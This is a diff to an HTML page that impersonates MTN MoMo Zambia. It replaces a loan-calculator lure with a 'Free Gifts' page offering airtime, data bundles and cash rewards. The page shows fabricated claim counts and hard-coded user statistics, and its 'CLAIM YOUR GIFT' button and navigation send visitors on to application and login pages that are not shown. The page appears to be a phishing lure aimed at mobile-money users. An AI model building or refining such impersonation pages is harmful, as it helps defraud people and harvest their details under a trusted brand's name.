@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTN MoMo - Get Your Loan</title>
+    <title>MTN MoMo - Free Gifts</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
         * {
             margin: 0;
             padding: 0;
@@ -74,113 +74,245 @@
         }
         
         .title {
-            font-size: 24px;
-            font-weight: 700;
-            color: #333;
+            font-size: 26px;
+            font-weight: 800;
+            color: #1a1a2e;
             margin-bottom: 5px;
+            line-height: 1.2;
+        }
+        
+        .title .highlight {
+            color: #FFC100;
+        }
+        
+        .title .highlight2 {
+            color: #0047AB;
         }
         
         .subtitle {
             font-size: 14px;
-            color: #777;
+            color: #888;
             margin-bottom: 20px;
         }
         
-        .calc-section {
+        /* ===== GIFTS SECTION ===== */
+        .gifts-section {
             background: #f8f9ff;
             border-radius: 16px;
             padding: 20px;
             text-align: left;
         }
         
-        .calc-title {
+        .gifts-title {
             font-size: 17px;
-            font-weight: 600;
+            font-weight: 700;
             text-align: center;
-            margin-bottom: 20px;
-            color: #333;
+            margin-bottom: 16px;
+            color: #1a1a2e;
         }
         
-        .input-group {
-            margin-bottom: 20px;
+        .gifts-title .emoji {
+            margin-right: 6px;
         }
         
-        .input-header {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 6px;
-            font-weight: 600;
-            font-size: 14px;
-        }
-        
-        .input-label { color: #333; }
-        .input-value { color: #0047AB; font-weight: 700; }
-        
-        .slider {
-            -webkit-appearance: none;
-            width: 100%;
-            height: 6px;
-            border-radius: 3px;
-            background: #e0e0e0;
-            outline: none;
-        }
-        
-        .slider::-webkit-slider-thumb {
-            -webkit-appearance: none;
-            width: 22px;
-            height: 22px;
-            border-radius: 50%;
+        .gifts-title .count {
             background: #0047AB;
-            cursor: pointer;
+            color: white;
+            font-size: 11px;
+            padding: 2px 12px;
+            border-radius: 20px;
+            font-weight: 600;
+            margin-left: 6px;
         }
         
-        .range-labels {
-            display: flex;
-            justify-content: space-between;
-            color: #999;
+        .gift-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+        
+        .gift-card {
+            background: white;
+            border-radius: 14px;
+            padding: 16px 10px;
+            text-align: center;
+            border: 2px solid #e8ecf5;
+            transition: all 0.3s;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .gift-card:hover {
+            border-color: #0047AB;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0,71,171,0.12);
+        }
+        
+        .gift-card .icon {
+            font-size: 32px;
+            display: block;
+            margin-bottom: 4px;
+        }
+        
+        .gift-card .name {
             font-size: 12px;
+            font-weight: 700;
+            color: #1a1a2e;
+            margin-bottom: 2px;
+        }
+        
+        .gift-card .value {
+            font-size: 14px;
+            font-weight: 800;
+            color: #0047AB;
+        }
+        
+        .gift-card .badge {
+            display: inline-block;
+            font-size: 9px;
+            font-weight: 700;
+            padding: 2px 10px;
+            border-radius: 20px;
             margin-top: 4px;
         }
         
-        .payment-box {
-            background: #FFC100;
-            padding: 15px;
-            border-radius: 12px;
-            text-align: center;
+        .gift-card .badge.free {
+            background: #e8f5e9;
+            color: #1e7e34;
         }
         
-        .payment-label {
-            display: block;
-            color: #1a1a2e;
-            font-size: 13px;
-            font-weight: 600;
+        .gift-card .badge.limited {
+            background: #fff3e0;
+            color: #e65100;
         }
         
-        .payment-amount {
-            font-size: 28px;
+        .gift-card .badge.hot {
+            background: #ffebee;
+            color: #c62828;
+            animation: pulse 1.5s infinite;
+        }
+        
+        .gift-card .badge.popular {
+            background: #e3f2fd;
+            color: #0047AB;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        .gift-card .users {
+            font-size: 9px;
+            color: #999;
+            margin-top: 4px;
+        }
+        
+        .gift-card .users .emoji {
+            font-size: 10px;
+        }
+        
+        .gift-card .claimed {
+            position: absolute;
+            top: 6px;
+            right: 6px;
+            background: #e8f5e9;
+            color: #1e7e34;
+            font-size: 8px;
             font-weight: 700;
-            color: #1a1a2e;
+            padding: 2px 8px;
+            border-radius: 20px;
         }
         
-        .apply-btn {
-            width: 100%;
-            padding: 16px;
+        /* ===== REGISTER BOX ===== */
+        .register-box {
             background: linear-gradient(135deg, #0047AB, #002D7A);
+            border-radius: 14px;
+            padding: 20px;
+            text-align: center;
             color: white;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .register-box::before {
+            content: '🎁';
+            position: absolute;
+            top: -20px;
+            right: -10px;
+            font-size: 80px;
+            opacity: 0.1;
+        }
+        
+        .register-box .box-title {
+            font-size: 18px;
+            font-weight: 800;
+            margin-bottom: 4px;
+        }
+        
+        .register-box .box-sub {
+            font-size: 13px;
+            opacity: 0.9;
+            margin-bottom: 12px;
+        }
+        
+        .register-box .box-sub .highlight {
+            color: #FFC100;
+            font-weight: 700;
+        }
+        
+        .register-box .register-btn {
+            width: 100%;
+            padding: 15px;
+            background: #FFC100;
+            color: #1a1a2e;
             border: none;
             border-radius: 50px;
             font-size: 17px;
             font-weight: 700;
             cursor: pointer;
             transition: transform 0.2s, box-shadow 0.2s;
-            margin-top: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
         
-        .apply-btn:hover {
+        .register-box .register-btn:hover {
             transform: scale(1.02);
-            box-shadow: 0 8px 25px rgba(0,71,171,0.3);
+            box-shadow: 0 8px 25px rgba(255,193,0,0.35);
         }
         
+        /* ===== STATS ===== */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 4px;
+        }
+        
+        .stat-item {
+            background: #f8f9ff;
+            border-radius: 12px;
+            padding: 14px 8px;
+            text-align: center;
+        }
+        
+        .stat-item .number {
+            font-size: 24px;
+            font-weight: 800;
+            color: #0047AB;
+        }
+        
+        .stat-item .label {
+            font-size: 10px;
+            color: #888;
+            font-weight: 500;
+        }
+        
+        /* ===== FEATURES ===== */
         .features {
             display: flex;
             justify-content: space-around;
@@ -200,6 +332,11 @@
             margin-bottom: 4px;
         }
         
+        .feature strong {
+            color: #1a1a2e;
+        }
+        
+        /* ===== BOTTOM NAV ===== */
         .bottom-nav {
             display: flex;
             justify-content: space-around;
@@ -220,9 +357,10 @@
             background: none;
             border: none;
             font-family: 'Inter', sans-serif;
+            transition: color 0.2s;
         }
         
-        .nav-item.active { color: #0047AB; }
+        .nav-item.active { color: #0047AB; font-weight: 600; }
         .nav-item .icon { font-size: 22px; display: block; }
         
         footer {
@@ -234,16 +372,64 @@
             max-width: 480px;
         }
         
+        footer a {
+            color: #0047AB;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        /* ===== NOTIFICATION ===== */
+        .notification {
+            position: fixed;
+            bottom: 80px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1a1a2e;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 14px;
+            font-size: 13px;
+            font-weight: 600;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            z-index: 100;
+            display: none;
+            max-width: 400px;
+            text-align: center;
+            animation: slideUp 0.4s ease;
+        }
+        
+        @keyframes slideUp {
+            0% { transform: translateX(-50%) translateY(20px); opacity: 0; }
+            100% { transform: translateX(-50%) translateY(0); opacity: 1; }
+        }
+        
         @media (max-width: 480px) {
             body { padding: 10px; }
             .card { padding: 20px 16px; }
-            .title { font-size: 20px; }
+            .title { font-size: 22px; }
             .features { flex-wrap: wrap; }
             .feature { flex: 1 0 80px; }
+            .gift-grid { grid-template-columns: repeat(3, 1fr); gap: 6px; }
+            .gift-card { padding: 12px 6px; }
+            .gift-card .icon { font-size: 26px; }
+            .gift-card .name { font-size: 10px; }
+            .gift-card .value { font-size: 12px; }
+            .stats { grid-template-columns: repeat(3, 1fr); gap: 6px; }
+            .stat-item .number { font-size: 18px; }
+            .stat-item { padding: 10px 6px; }
+            .register-box .box-title { font-size: 16px; }
+            .register-box .register-btn { font-size: 15px; padding: 13px; }
+        }
+        
+        @media (max-width: 380px) {
+            .gift-grid { grid-template-columns: repeat(2, 1fr); }
         }
     </style>
 </head>
 <body>
+
+    <!-- Notification -->
+    <div class="notification" id="notification"></div>
 
     <!-- Header -->
     <header>
@@ -256,37 +442,93 @@
 
     <!-- Main Content -->
     <div class="card">
-        <h1 class="title">Get Your Loan Approved Fast</h1>
-        <p class="subtitle">Quick approval • Competitive rates • Flexible terms</p>
+        <h1 class="title">
+            🎁 Get Free <span class="highlight">MoMo</span> <span class="highlight2">Gifts</span>
+        </h1>
+        <p class="subtitle">Exclusive offers • Free airtime • Data bundles • Cash rewards</p>
         
-        <div class="calc-section">
-            <h2 class="calc-title">Loan Calculator</h2>
-            
-            <div class="input-group">
-                <div class="input-header">
-                    <span class="input-label">Loan Amount (ZMW)</span>
-                    <span class="input-value" id="amountValue">ZMW 5,000</span>
-                </div>
-                <input type="range" class="slider" min="100" max="10000" step="100" value="5000" id="amountSlider">
-                <div class="range-labels"><span>ZMW 100</span><span>ZMW 10,000</span></div>
+        <div class="gifts-section">
+            <div class="gifts-title">
+                <span class="emoji">🎁</span> Today's Featured Gifts
+                <span class="count">12 Offers</span>
             </div>
             
-            <div class="input-group">
-                <div class="input-header">
-                    <span class="input-label">Loan Term</span>
-                    <span class="input-value" id="termValue">12 months</span>
+            <!-- Gift Grid -->
+            <div class="gift-grid">
+                <div class="gift-card" onclick="showGift('Airtime', 'ZMW 179')">
+                    <span class="icon">📱</span>
+                    <div class="name">Airtime</div>
+                    <div class="value">ZMW 179</div>
+                    <span class="badge free">FREE</span>
+                    <div class="users"><span class="emoji">👤</span> 2.4k claimed</div>
                 </div>
-                <input type="range" class="slider" min="3" max="36" step="3" value="12" id="termSlider">
-                <div class="range-labels"><span>3 months</span><span>36 months</span></div>
+                <div class="gift-card" onclick="showGift('Data Bundle', '5GB')">
+                    <span class="icon">🌐</span>
+                    <div class="name">Data Bundle</div>
+                    <div class="value">5GB</div>
+                    <span class="badge hot">🔥 HOT</span>
+                    <div class="users"><span class="emoji">👤</span> 5.1k claimed</div>
+                </div>
+                <div class="gift-card" onclick="showGift('Cash Reward', 'ZMW 1,856')">
+                    <span class="icon">💰</span>
+                    <div class="name">Cash Reward</div>
+                    <div class="value">ZMW 1,856</div>
+                    <span class="badge limited">LIMITED</span>
+                    <div class="users"><span class="emoji">👤</span> 892 claimed</div>
+                </div>
+                <div class="gift-card" onclick="showGift('Music Streaming', '3 Months')">
+                    <span class="icon">🎵</span>
+                    <div class="name">Music Streaming</div>
+                    <div class="value">3 Months</div>
+                    <span class="badge popular">⭐ POPULAR</span>
+                    <div class="users"><span class="emoji">👤</span> 3.7k claimed</div>
+                </div>
+                <div class="gift-card" onclick="showGift('Video Bundle', '10GB')">
+                    <span class="icon">📺</span>
+                    <div class="name">Video Bundle</div>
+                    <div class="value">10GB</div>
+                    <span class="badge free">FREE</span>
+                    <div class="users"><span class="emoji">👤</span> 1.8k claimed</div>
+                </div>
+                <div class="gift-card" onclick="showGift('Shopping Voucher', 'ZMW 2,500')">
+                    <span class="icon">🛒</span>
+                    <div class="name">Shopping Voucher</div>
+                    <div class="value">ZMW 2,500</div>
+                    <span class="badge hot">🔥 HOT</span>
+                    <div class="users"><span class="emoji">👤</span> 1.2k claimed</div>
+                </div>
             </div>
             
-            <div class="payment-box">
-                <span class="payment-label">Monthly Payment</span>
-                <span class="payment-amount" id="paymentAmount">ZMW 434.94</span>
+            <!-- Register Box -->
+            <div class="register-box">
+                <div class="box-title">🎯 You Qualify for a Free Gift!</div>
+                <div class="box-sub">
+                    <span class="highlight">12,847 users</span> have already claimed their gifts. 
+                    Don't miss out!
+                </div>
+                <button class="register-btn" id="registerBtn">
+                    🎁 CLAIM YOUR GIFT
+                </button>
             </div>
         </div>
-        
-        <button class="apply-btn" id="applyBtn">APPLY NOW</button>
+    </div>
+
+    <!-- Stats -->
+    <div class="card" style="padding: 20px;">
+        <div class="stats">
+            <div class="stat-item">
+                <div class="number" id="usersCount">0</div>
+                <div class="label">Users Registered</div>
+            </div>
+            <div class="stat-item">
+                <div class="number" id="giftsCount">0</div>
+                <div class="label">Gifts Given</div>
+            </div>
+            <div class="stat-item">
+                <div class="number" id="offersCount">0</div>
+                <div class="label">Active Offers</div>
+            </div>
+        </div>
     </div>
 
     <!-- Features -->
@@ -294,15 +536,15 @@
         <div class="features">
             <div class="feature">
                 <span class="feature-icon">⚡</span>
-                Fast Approval<br>Within 24 hours
+                Instant<br><strong>Free Gifts</strong>
             </div>
             <div class="feature">
-                <span class="feature-icon">💰</span>
-                Low Rates<br>From 8%
+                <span class="feature-icon">🎯</span>
+                Exclusive<br><strong>Offers Daily</strong>
             </div>
             <div class="feature">
                 <span class="feature-icon">🔒</span>
-                Secure<br>Bank-level
+                Secure<br><strong>MoMo Verified</strong>
             </div>
         </div>
     </div>
@@ -314,8 +556,8 @@
             Home
         </button>
         <button class="nav-item" onclick="window.location.href='application.html'">
-            <span class="icon">📝</span>
-            Apply
+            <span class="icon">🎁</span>
+            Gifts
         </button>
         <button class="nav-item" onclick="window.location.href='login.html'">
             <span class="icon">🔐</span>
@@ -323,37 +565,78 @@
         </button>
     </div>
 
-    <footer>© 2026 MTN MoMo Zambia</footer>
+    <footer>
+        © 2026 MTN MoMo Zambia • 
+        <a href="#" onclick="alert('Call 155 for support')">Help</a> • 
+        <a href="#" onclick="alert('Terms & Conditions')">Terms</a>
+    </footer>
 
     <script>
-        const amountSlider = document.getElementById('amountSlider');
-        const termSlider = document.getElementById('termSlider');
-        const amountValue = document.getElementById('amountValue');
-        const termValue = document.getElementById('termValue');
-        const paymentAmount = document.getElementById('paymentAmount');
-
-        function updateCalculator() {
-            const amount = parseFloat(amountSlider.value);
-            const months = parseFloat(termSlider.value);
-            amountValue.textContent = 'ZMW ' + amount.toLocaleString();
-            termValue.textContent = months + (months === 1 ? ' month' : ' months');
+        // ============================================
+        // STATS - Auto-increment animation
+        // ============================================
+        function animateCounter(element, target, duration = 2000) {
+            const start = 0;
+            const startTime = performance.now();
             
-            const annualRate = 0.08;
-            const monthlyRate = annualRate / 12;
-            const power = Math.pow(1 + monthlyRate, months);
-            const monthlyPayment = amount * (monthlyRate * power) / (power - 1);
-            paymentAmount.textContent = 'ZMW ' + monthlyPayment.toFixed(2);
+            function update(currentTime) {
+                const elapsed = currentTime - startTime;
+                const progress = Math.min(elapsed / duration, 1);
+                const current = Math.floor(progress * target);
+                element.textContent = current.toLocaleString();
+                
+                if (progress < 1) {
+                    requestAnimationFrame(update);
+                } else {
+                    element.textContent = target.toLocaleString();
+                }
+            }
+            
+            requestAnimationFrame(update);
         }
 
-        updateCalculator();
-        amountSlider.addEventListener('input', updateCalculator);
-        termSlider.addEventListener('input', updateCalculator);
+        // Animate stats on load
+        window.addEventListener('load', () => {
+            animateCounter(document.getElementById('usersCount'), 12847);
+            animateCounter(document.getElementById('giftsCount'), 15723);
+            animateCounter(document.getElementById('offersCount'), 12);
+        });
 
-        document.getElementById('applyBtn').addEventListener('click', function() {
-            localStorage.setItem('loanAmount', amountSlider.value);
-            localStorage.setItem('loanTerm', termSlider.value);
+        // ============================================
+        // SHOW GIFT NOTIFICATION
+        // ============================================
+        function showGift(name, value) {
+            const notification = document.getElementById('notification');
+            notification.innerHTML = `🎁 <strong>${name}</strong> — ${value} <br><span style="font-weight:400;font-size:12px;opacity:0.8;">Click "CLAIM YOUR GIFT" to get it!</span>`;
+            notification.style.display = 'block';
+            
+            // Auto-hide after 4 seconds
+            clearTimeout(window.notificationTimeout);
+            window.notificationTimeout = setTimeout(() => {
+                notification.style.display = 'none';
+            }, 4000);
+        }
+
+        // ============================================
+        // REGISTER BUTTON
+        // ============================================
+        document.getElementById('registerBtn').addEventListener('click', function() {
+            // Store that user came from gifts page
+            localStorage.setItem('source', 'gifts');
             window.location.href = 'application.html';
         });
+
+        // ============================================
+        // HIDE NOTIFICATION ON CLICK
+        // ============================================
+        document.getElementById('notification').addEventListener('click', function() {
+            this.style.display = 'none';
+        });
+
+        console.log('====================================');
+        console.log('🎁 MTN MoMo Gifts - Homepage Loaded');
+        console.log('📊 Stats: 12,847 Users | 15,723 Gifts | 12 Offers');
+        console.log('====================================');
     </script>
 
 </body>
